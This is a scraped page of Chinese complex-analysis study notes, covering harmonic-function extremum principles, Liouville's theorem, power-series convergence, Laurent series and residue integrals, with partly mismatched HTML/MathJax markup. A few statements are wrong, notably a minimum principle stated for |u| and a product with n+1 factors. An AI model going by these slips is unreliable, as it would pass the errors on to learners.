调和函数最大值原理</h3><p>$\textbf{Example:}$<br>$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则</p><script type="math/tex; mode=display">\max_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \max_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$ ◻$\textbf{Solution:}$由于 $u$ 为调和函数, 故存在调和函数 $v$,其中 $u, v$ 满足 $Cauchy-Riemann$ 条件, 使得 $f(z) = u + iv$ 为解析函数.令 $g(z) = e^{f(z)}\thinspace(z\in D\cup\partial D)$, 那么$g'(z) = f'(z)e^{f(z)}$ 处处存在.由最大模原理,$$\max_{z\in D\cup\partial D}\limits\left|{g(z)}\right| = \max_{z\in \partial D}\limits\left|{g(z)}\right|.</script><p>又因为</p><script type="math/tex; mode=display">\left|{g(z)}\right| = \left|{e^{f(z)}}\right| = \left|{e^{u + iv}}\right| = \left|{e^u}\right|\cdot \left|{e^{iv}}\right| = e^u,</script><p>故</p><script type="math/tex; mode=display">\max_{z\in D\cup\partial D}\limits e^{u(x, y)} = \max_{z\in \partial D}\limits e^{u(x, y)}.</script><p>即得</p><script type="math/tex; mode=display">\max_{z\in D\cup\partial D}\limits u(x, y) = \max_{z\in \partial D}\limits u(x, y).$$ ◻### 6. 调和函数最小值原理$\textbf{Example:}$$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则$$\min_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \min_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$ ◻$\textbf{Solution:}$注意到 $u_0(x, y) = -u(x, y)$ 也为 $D$ 上的调和函数,对其使用调和函数最大值原理即可. ◻### 7. $M(r)$的应用$\textbf{Example:}$定义$$M(r) = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|.$$ ◻$\textbf{Example:}$$f(z)$ 为整函数, 则$$\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}.$$ ◻$\textbf{Solution:}$注意到$$f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},</script><p>那么 <script type="math/tex">\begin{aligned}            \left|{f^{(n)}(0)}\right| &= \frac{n!}{2\pi}\left|{\thinspace\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}}}\right| \\            &\le \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\left|{\frac{f(z)}{z^{n + 1}}}\right|\left|{dz}\right| \\            &= \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\frac{\left|{f(z)}\right|}{r^{n + 1}}\left|{d(re^{i\theta})}\right| \\            &\le \frac{n!}{2\pi}\int_{0}^{2\pi}\frac{M(r)}{r^n}d\theta \\            &= \frac{n!M(r)}{r^n}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>有界的整函数为常数<strong>(Liouville定理)</strong>. ◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.</script><p>只需要证明 <script type="math/tex">f^{(n)}(0)\equiv 0, \thinspace\forall\thinspace n\ge 1.</script></p><p>由 $f(z)$ 有界, 故 $\exists\thinspace M_0\in\mathbb{R}$, 使</p><script type="math/tex; mode=display">\left|{f(z)}\right|\le M_0, \thinspace\forall z\in\mathbb{C}.</script><p>由</p><script type="math/tex; mode=display">f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},</script><p>可得</p><script type="math/tex; mode=display">\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}\le \frac{n!M_0}{r^n}.</script><p>注意到当 $r\rightarrow\infty$, 有 <script type="math/tex">\left|{f^{(n)}(0)}\right| = 0,</script></p><p>即 <script type="math/tex">f^{(n)}(0) = 0\thinspace, \thinspace\forall\thinspace n\ge 1.</script></p><p>从而 $f(z)\equiv f(0)$ 为常数. ◻</p><p>$\textbf{Example:}$<br>$f(z)$ 为整函数, 且存在 $M_0 &gt; 0$, 使</p><script type="math/tex; mode=display">\left|{f(z)}\right|\le M\sum_{k = 0}^{n}\limits\left|{z}\right|^k.</script><p>则 $f(z)$ 是一个次数不高于 $n$ 的多项式. ◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.</script><p>只需要证明</p><script type="math/tex; mode=display">f^{(n + i)}(0)\equiv 0, \thinspace\forall\thinspace i\ge 1.</script><p>可得</p><script type="math/tex; mode=display">\left|{f^{(n + i)}(0)}\right|\le \frac{(n + i)!M(r)}{r^{n + i}}\le \frac{(n + i)!M_0}{r^{n + i}}\sum_{k = 0}^{n}\limits r^k.</script><p>注意到当 $r\rightarrow\infty$ 时, 有</p><script type="math/tex; mode=display">\left|{f^{(n + i)}(0)}\right| = 0,</script><p>即 <script type="math/tex">f^{(n + i)}(0) = 0, \thinspace\forall\thinspace i\ge 1.</script></p><p>从而 <script type="math/tex">f(z)\equiv \sum_{k = 0}^{n}\limits\frac{1}{k!}f^{(k)}(0)z^k</script></p><p>为一个次数不高于 $n$ 的多项式. ◻</p><h3 id="8-代数学基本定理"><a href="#8-代数学基本定理" class="headerlink" title="8. 代数学基本定理"></a>8. 代数学基本定理</h3><p>$\textbf{Example:}$<br>设<br>$P_n(z) = \sum_{k = 0}^{n}\limits C_kz^k\thinspace(C_n\ne 0, n\ge 1)$,<br>则 <script type="math/tex">P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k),</script></p><p>即 <script type="math/tex">\exists z_1\in \mathbb{C}, P_n(z_1) = 0.</script> ◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $f(z) = \cfrac{1}{P_n(z)}$, 则 <script type="math/tex">f'(z) = -\cfrac{P'_n(z)}{P_n^2(z)}</script></p><p>处处存在, 那么 $f(z)$ 满足最大模原理, 有</p><script type="math/tex; mode=display">\max_{\left|{z}\right|\le r}\limits\left|{f(z)}\right| = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|\rightarrow 0, \mbox{当}r\rightarrow\infty.</script><p>但结合 $f(0) = \cfrac{1}{C_0}\ne 0$, 显然矛盾.</p><p>故 $\exists\thinspace z_1\in \mathbb{C}$, 使得</p><script type="math/tex; mode=display">P_n(z_1) = 0\thinspace\Longleftrightarrow P_n(z) = (z - z_1)P_{n - 1}(z).</script><p>重复可得 <script type="math/tex">P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k).</script> ◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $g(z) = \cfrac{1}{P_n(z)}$, 则 <script type="math/tex">g'(z) = -\cfrac{P'_n(z)}{P_n^2(z)}</script></p><p>处处存在, 那么 $g(z)$ 在 $\mathbb{C}$ 内解析. 由于</p><script type="math/tex; mode=display">P_n(z)\rightarrow\infty, \mbox{当}r\rightarrow\infty,</script><p>故 <script type="math/tex">g(z)\rightarrow 0, \mbox{当}r\rightarrow\infty,</script></p><p>即 $g(z)$ 有界.</p><p>由 $Liouville$ 定理, 得 $g(z)$ 为常数, 进而 $P_n(z)$ 为常数.</p><p>这与 $C_n\ne 0$ 矛盾. 以下同 $\textit{Proof 1}$. ◻</p><h3 id="9-幂级数的收敛半径"><a href="#9-幂级数的收敛半径" class="headerlink" title="9. 幂级数的收敛半径"></a>9. 幂级数的收敛半径</h3><p>$\textbf{Example:}$<br>对幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若存在<br>$R &gt; 0$, 使得</p><p>当 $\left|{z}\right| &gt; R$ 时 $f(z)$ 发散, 当 $\left|{z}\right| &lt; R$ 时<br>$f(z)$ 绝对收敛,</p><p>那么称 $R$ 为 $f(z)$ 的收敛半径. ◻</p><p>$\textbf{Example:}$<br>$\textbf{(Abel定理)}$ 对幂级数<br>$f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若</p><p>$f(z)$ 在 $z = z_1\ne 0$ 处收敛, 则在<br>$\left|{z}\right| &lt; \left|{z_1}\right|$ 绝对收敛;</p><p>$f(z)$ 在 $z = z_2\ne 0$ 处发散, 则在<br>$\left|{z}\right| &gt; \left|{z_2}\right|$ 发散. ◻</p><p>$\textbf{Example:}$<br>若幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$ 在 $z_0$<br>处条件收敛, 则收敛半径 $R = \left|{z_0}\right|$. ◻</p><p>$\textbf{Solution:}$<br>由收敛半径的定义:</p><p>若 $\left|{z_o}\right| &gt; R$ $\Longrightarrow$ $f(z_0)$ 发散, 与题设矛盾,<br>故 $f(z_0)$ 收敛, $\left|{z_0}\right|\le R$.</p><p>若 $\left|{z_0}\right| &lt; R$ $\Longrightarrow$ $f(z_0)$ 绝对收敛,<br>与题设矛盾, 故 $\left|{z_0}\right|\ge R$.</p><p>综上, 得 $\left|{z_0}\right| = R$. ◻</p><p>$\textbf{Example:}$<br>对幂级数</p><script type="math/tex; mode=display">f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k, g(z) = \sum_{k = 0}^{\infty}\limits d_kz^k</script><p>当 $n$ 充分大时, 有 $\left|{d_n}\right| \le \left|{c_n}\right|$,<br>则收敛半径 $R_1\le R_2$. ◻</p><p>$\textbf{Example:}$<br>若 $c_n = a_n + ib_n, a_n, b_n\in\mathbb{R}$, 对幂级数</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n</script><p>其中<br>$\sum_{n = 0}^{\infty}\limits a_nz^n, \sum_{n = 0}^{\infty}\limits b_nz^n$<br>的收敛半径分别为 $R_1, R_2$, 那么 $\sum_{n = 0}^{\infty}\limits c_nz^n$<br>的收敛半径 $R = \min\left\{R_1, R_2\right\}$. ◻</p><p>$\textbf{Solution:}$<br>不妨设 $R_1\le R_2$, 此时 $\min\left\{R_1, R_2\right\} = R_1$.</p><p>下证 $R = R_1$. 先证 $R_1\ge R$.</p><p>由 $c_n = a_n + ib_n$, 有 $\left|{c_n}\right| \ge \left|{a_n}\right|$,<br>进而</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right|.</script><p>那么当 $\left|{z}\right| &lt; R$ 时, 由收敛半径定义,</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right| < \infty.</script><p>此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$ 绝对收敛, 那么 $R_1 \ge R$.</p><p>再证 $R_1\le R$.</p><p>若 $R_1 &gt; R$, 取<br>$z = \cfrac{1}{2}\left(R + R_1\right)\in\left(R, R_1\right)$ 由</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n</script><p>那么此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$,<br>$\sum_{n = 0}^{\infty}\limits b_nz^n$ 均收敛,</p><p>进而 $\sum_{n = 0}^{\infty}\limits c_nz^n$ 收敛, 且 $z &gt; R$,<br>与收敛半径定义矛盾. 故 $R_1\le R$.</p><p>综上, 有 $R = \min\left\{R_1, R_2\right\}$ 成立. ◻</p><p>$\textbf{Example:}$<br>若 $f(z)$ 在 $R$ 上无奇点, 则收敛半径 $R = +\infty$;</p><p>若 $f(z)$ 在 $R$ 上有奇点 $z_1, z_2, \cdots, z_n$, 则收敛半径<br>$R = \min_{1\le k\le n}\limits \left|{z_k}\right|$. ◻</p><h3 id="10-幂级数的敛散性"><a href="#10-幂级数的敛散性" class="headerlink" title="10. 幂级数的敛散性"></a>10. 幂级数的敛散性</h3><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">f_1(z) = \sum_{n = 1}^{\infty}\limits z^n</script><p>在收敛圆周上处处发散. ◻</p><p>$\textbf{Solution:}$<br>收敛半径 $R = 1$. 当 $\left|{z}\right| = 1$ 时,<br>$z = e^{i\theta}\thinspace(\theta\in\left[0, 2\pi\right))$,</p><p>那么</p><script type="math/tex; mode=display">\left|{z^n}\right| = \left|{e^{in\theta}}\right| = 1\nrightarrow 0, \mbox{当}\thinspace n\rightarrow \infty.</script><p>由 $Cauchy$ 收敛准则, <script type="math/tex">f_1(z) = \sum_{n = 1}^{\infty}\limits z^n</script></p><p>在收敛圆周上处处发散. ◻</p><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">f_2(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n}</script><p>在收敛圆周上部分发散, 部分收敛. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">f_2(z) = \sum_{n = 1}^{\infty}\limits\int_{0}^{z} t^{n - 1}dt = \int_{0}^{z}\sum_{n = 1}^{\infty}\limits t^{n - 1}dt = -\ln(1 - z), \left|{z}\right| < 1 = R.</script><p>且 $f_2(1) = \sum_{n = 1}^{\infty}\limits\cfrac{1}{n}$ 发散,<br>$f_2(-1) = \sum_{n = 1}^{\infty}\limits\cfrac{(-1)^n}{n} = -\ln2$ 收敛.</p><p>那么 <script type="math/tex">f_2(z) = \sum_{n = 1}^{\infty}\limits\frac{z^n}{n}</script></p><p>在收敛圆周上部分发散, 部分收敛. ◻</p><p>$\textbf{Example:}$<br>给出</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n}</script><p>的和函数, 其中 $\theta\in\left(0, 2\pi\right)$. ◻</p><p>$\textbf{Solution:}$<br>注意到对于<br>$z = x + iy\in\mathbb{C}, \mbox{其中}\thinspace x, y\in\mathbb{R}$, 有</p><script type="math/tex; mode=display">\ln(x + iy) = \ln\left|{x + iy}\right| + i\theta = \frac{1}{2}\ln(x^2 + y^2) + i\arctan\frac{y}{x}.</script><p>对于 $z = re^{i\theta}, 0\le r &lt; 1, 0\le\theta &lt; 2\pi$, 有</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{r^ne^{in\theta}}{n} = -\ln(1-re^{i\theta}) = -\ln(1-r\cos\theta - i\sin\theta),</script><p>展开得</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{r^n\cos{n\theta}}{n} + i\sum_{n = 1}^{\infty}\limits\frac{r^n\sin{n\theta}}{n} = -\frac{1}{2}\ln(1 - 2r\cos\theta + r^2) + i\arctan\frac{r\sin\theta}{1 - r\cos\theta}.</script><p>当 $\theta\in\left(0, 2\pi\right)$ 时, 令 $r\rightarrow 1^{-}$, 即得</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n} = -\frac{1}{2}\ln(2 - 2\cos\theta) = -\ln\left(2\sin\frac{\theta}{2}\right),</script><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n} = \arctan\frac{\sin\theta}{1 - \cos\theta} = \arctan\left(\cot\frac{\theta}{2}\right) = \frac{\pi - \theta}{2}.$$ ◻$\textbf{Example:}$给出$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2}</script><p>的和函数, 其中 $\theta\in\left[0, 2\pi\right)$. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\frac{1}{n^2} - \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\sin{nt}}{n}dt = \frac{\pi^2}{6} - \frac{\theta\left(2\pi - \theta\right)}{4}.</script><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\cos{nt}}{n}dt = \int_{0}^{\theta}\sum_{n = 1}^{\infty}\limits\frac{\cos{nt}}{n}dt = -\int_{0}^{\theta}\ln\left(2\sin\frac{t}{2}\right)dt.$$ ◻$\textbf{Example:}$$$f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}</script><p>在收敛圆周上处处收敛. ◻</p><p>$\textbf{Solution:}$<br>注意到当 $\left|{z}\right| = 1$ 时,</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\left|{\frac{z^n}{n^2}}\right| = \sum_{n = 1}^{\infty}\frac{1}{n^2} = \frac{\pi^2}{6},</script><p>那么 <script type="math/tex">f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}</script></p><p>在收敛圆周上处处收敛. ◻</p><p>$\textbf{Example:}$<br>幂级数收敛圆周上的点都是其奇点. ◻</p><h3 id="11-Laurent-级数"><a href="#11-Laurent-级数" class="headerlink" title="11. Laurent 级数"></a>11. Laurent 级数</h3><p>$\textbf{Example:}$<br>$\mathbb{C}^2$ 上的分片函数: <script type="math/tex">f(z) = \cfrac{1}{1 + z^2} =         \begin{cases}            \sum_{n = 0}^{\infty}\limits(-1)^nz^{2n}, \left|{z}\right| < 1 \\            \cfrac{1}{1 + z^2}, \left|{z}\right| = 1, z\ne\pm i \\            \sum_{n = 0}^{\infty}\limits\cfrac{(-1)^n}{z^{2(n + 1)}}, \left|{z}\right| > 1         \end{cases}</script> ◻</p><h3 id="12-留数-A"><a href="#12-留数-A" class="headerlink" title="12. 留数 A"></a>12. 留数 A</h3><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I = \oint_{\left|{z}\right| = \varepsilon > 1}e^{\frac{1}{z}}dz.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 记$z = \varepsilon e^{i\theta}$, 那么$t = \cfrac{1}{\varepsilon}e^{-i\theta}$,$\theta\in\left[0, 2\pi\right)$.那么$$I = -\oint_{\left|{t}\right| = \frac{1}{\varepsilon}}{e^t\left(-\frac{dt}{t^2}\right)} = \oint_{\left|{t}\right| = \frac{1}{\varepsilon}}\frac{e^t}{t^2}dt = 2\pi i\left(e^t\right)'|_{t = 0} = 2\pi i.$$ ◻$\textbf{Solution:}$注意到$$I = \oint_{\left|{z}\right| = \varepsilon}\limits e^{\frac{1}{z}}dz = \sum_{n = 0}^{+\infty}\cfrac{1}{n!}\oint_{\left|{z}\right| = \varepsilon}\cfrac{dz}{z^n} = \sum_{n = 0}^{+\infty}\limits\cfrac{1}{n!}I_n = I_1 = 2\pi i.$$ ◻$\textbf{Example:}$求复积分$$J_n = \oint_{\left|{z}\right| = r > 1}\cfrac{dz}{1 + z^n}, n\in\mathbb{N}.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 那么$$\begin{aligned}            J_n &= -\oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{1}{1 + \frac{1}{t^n}}\left(-\frac{dt}{t^2}\right) \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{t^{n - 2}}{1 + t^n}dt \\            &= \begin{cases}                2\pi i, n = 1; \\                0, n\ge 2.            \end{cases}        \end{aligned}$$ ◻$\textbf{Solution:}$$$\begin{aligned}            J_n &= 2\pi i\sum_{k = 1}^{n}\limits Res\left[\frac{1}{1 + z^n}, z_k\right] \\            &= 2\pi i\sum_{k = 1}^{n}\limits\cfrac{1}{nz_k^{n - 1}} \\            &= \cfrac{2\pi i}{n}\sum_{k = 1}^{n}(-z_k) \\            &= -\cfrac{2\pi i}{n}\sum_{k = 1}^{n}z_k \\            &= \begin{cases}                2\pi i, n = 1; \\                0, n\ge 2.            \end{cases}        \end{aligned}$$ ◻$\textbf{Example:}$给出$$K_n = \oint_{\left|{z}\right| = r > 1}\cfrac{z^{2n}dz}{1 + z^n} = \oint_{\left|{z}\right| = r}\cfrac{dz}{1 + z^n} + \oint_{\left|{z}\right| = r}(z^n - 1) = J_n, n\in\mathbb{N}.$$ ◻$\textbf{Example:}$求复积分$$J = \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt = \cfrac{2\pi i}{3!}\left(\frac{e^t}{1 + t}\right)^{(3)}|_{t = 0} = -\frac{2}{3}\pi i.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$\begin{aligned}            J &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4 + t^4)}{t^4(1 + t)}dt \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4)}{t^4(1 + t)}dt + \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^tt^4}{1 + t}dt \\            &= \oint\frac{e^t}{t^4}dt - \oint\frac{e^t}{t^3}dt + \oint\frac{e^t}{t^2}dt - \oint\frac{e^t}{t}dt \\            &= 2\pi i\left(\frac{1}{3!} - \frac{1}{2!} + \frac{1}{1!} - \frac{1}{0!}\right) \\            &= -\frac{2}{3}\pi i.        \end{aligned}$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt,</script><p>注意到 <script type="math/tex">\begin{aligned}            \frac{e^t}{t^4(1 + t)} &= \frac{1}{t^4}\left(1 + t + \frac{t^2}{2!} + \frac{t^3}{3!} + \cdots\right)\left(1 - t + t^2 - t^3 + \cdots\right) \\            &= \frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right),        \end{aligned}</script></p><p>故 <script type="math/tex">\begin{aligned}            J &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right) \\            &= I_4 + \frac{1}{2}I_2 - \frac{1}{3}I_1 \\            &= -\frac{1}{3}I_1 \\            &= -\frac{2}{3}\pi i.        \end{aligned}</script> ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            J &= \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \\            &= 2\pi i\left\{Res\left[f, 0\right] + Res\left[f, -1\right]\right\}.        \end{aligned}</script><p>注意到 <script type="math/tex">\begin{aligned}            Res\left[f, -1\right] = \frac{(-1)^3e^{-1}}{1} = -e^{-1},        \end{aligned}</script></p><p>而 $Res\left[f, 0\right]$ 为 $f$ 在 $z_0 = 0$ 处 $Larent$ 级数中的系数<br>$C_{-1}$.</p><p>注意到 <script type="math/tex">\begin{aligned}            \frac{z^3e^{\frac{1}{z}}}{1 + z} = z^3\left(1 + \frac{1}{z} + \frac{1}{2!z^2} + \frac{1}{3!z^3} + \cdots\right)\left(1 - z + z^2 - z^3 + \cdots\right),        \end{aligned}</script></p><p>那么</p><script type="math/tex; mode=display">C_{-1} = \frac{1}{4!} - \frac{1}{5!} + \frac{1}{6!} - \frac{1}{7!} + \cdots = e^{-1} - \frac{1}{3}.</script><p>进而 <script type="math/tex">\begin{aligned}            J &= \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \\            &= 2\pi i\left\{Res\left[f, 0\right] + Res\left[f, -1\right]\right\} \\            &= 2\pi i\left(-e^{-1} + e^{-1} - \frac{1}{3}\right) \\            &= -\frac{2}{3}\pi i.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta},</script><p>其中 $a &gt; \left|{b}\right|$, $a, b\in\mathbb{R}$. ◻</p><p>$\textbf{Solution:}$<br>令</p><script type="math/tex; mode=display">z = e^{i\theta}\Longrightarrow \cos\theta = \cfrac{z + z^{-1}}{2}.</script><p>那么</p><script type="math/tex; mode=display">dz = ie^{i\theta}d\theta = izd\theta\Longrightarrow d\theta = \cfrac{dz}{iz}.</script><p>进而</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\frac{z + z^{-1}}{2}} = \cfrac{2}{i}\oint_{\left|{z}\right| = 1}\cfrac{dz}{bz^2 + 2az + b}.</script><p>$\circ$ 若 $b = 0$, 得 <script type="math/tex">I_{a, b} = \frac{2\pi}{a}.</script></p><p>$\circ$ 若 $b &gt; 0$, 考虑方程 $z^2 + 2\cfrac{a}{b}z + 1 = 0$. 解得</p><script type="math/tex; mode=display">\begin{aligned}            \begin{cases}                z_1 = -\cfrac{a}{b} + \cfrac{\sqrt{a^2 - b^2}}{b},\\                z_2 = -\cfrac{a}{b} - \cfrac{\sqrt{a^2 - b^2}}{b} < -\cfrac{a}{b} < -1.                    \end{cases}        \end{aligned}</script><p>故</p><script type="math/tex; mode=display">I_{a, b} = \cfrac{2}{i}\cdot 2\pi i\cdot Res\left[f(z), z_1\right] = \cfrac{2}{i}\cdot 2\pi i\cdot\cfrac{1}{2bz_1 + 2a} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.</script><p>$\circ$ 若 $b &lt; 0$, 同理有</p><script type="math/tex; mode=display">I_{a, b} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.</script><p>综上, 有</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.$$ ◻$\textbf{Example:}$求复积分$$I_p = \int_{0}^{2\pi}\cfrac{d\theta}{1 + p^2 - 2p\cos\theta},</script><p>其中 $p\in(-1, 1).$ ◻</p><p>$\textbf{Solution:}$<br>在 $I_{a, b}$ 中取 $a = 1 + p^2$, $b = -2p$, 得</p><script type="math/tex; mode=display">I_p = \cfrac{2\pi}{\sqrt{(1 + p^2)^2 - (-2p)^2}} = \cfrac{2\pi}{1 - p^2}.$$ ◻$\textbf{Example:}$求复积分$$J_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a^2\cos^2\theta + b^2\sin^2\theta},</script><p>其中 $a &gt; 0$, $b &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">J_{a, b} = \int_{0}^{2\pi}\cfrac{2d\theta}{(a^2 + b^2) + (a^2 - b^2)\cos 2\theta} = \int_{0}^{4\pi}\cfrac{dt}{(a^2 + b^2) + (a^2 - b^2)\cos t},</script><p>在 $I_{A, B}$ 中取 $A = a^2 + b^2$, $B = a^2 - b^2$, 得</p><script type="math/tex; mode=display">J_{a, b} = 2\cfrac{2\pi}{\sqrt{(a^2 + b^2)^2 - (a^2 - b^2)^2}} = \cfrac{2\pi}{ab}.$$ ◻### 13. 留数 B$\textbf{Example:}$$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足$\deg Q\ge\deg P + 2$, 则$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)}{Q(z)}dz = 0.$$ ◻$\textbf{Example:}$求积分$$I_{a, b} = \int_{0}^{+\infty}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)},</script><p>其中 $a &gt; 0$, $b &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">I_{a, b} = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            I_{a, b} &= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \\            &= \pi i\left(Res\left[f(z), ai\right], Res\left[f(z), bi\right]\right) \\            &= \pi i\left(\frac{1}{2ai(a^2 + b^2 +2(ai)^2)} + \frac{1}{2bi(a^2 + b^2 +2(bi)^2)}\right) \\            &= \frac{\pi}{2ab(a + b)}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">I_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^{2n}}.</script> ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">I_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{1 + x^{2n}}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; 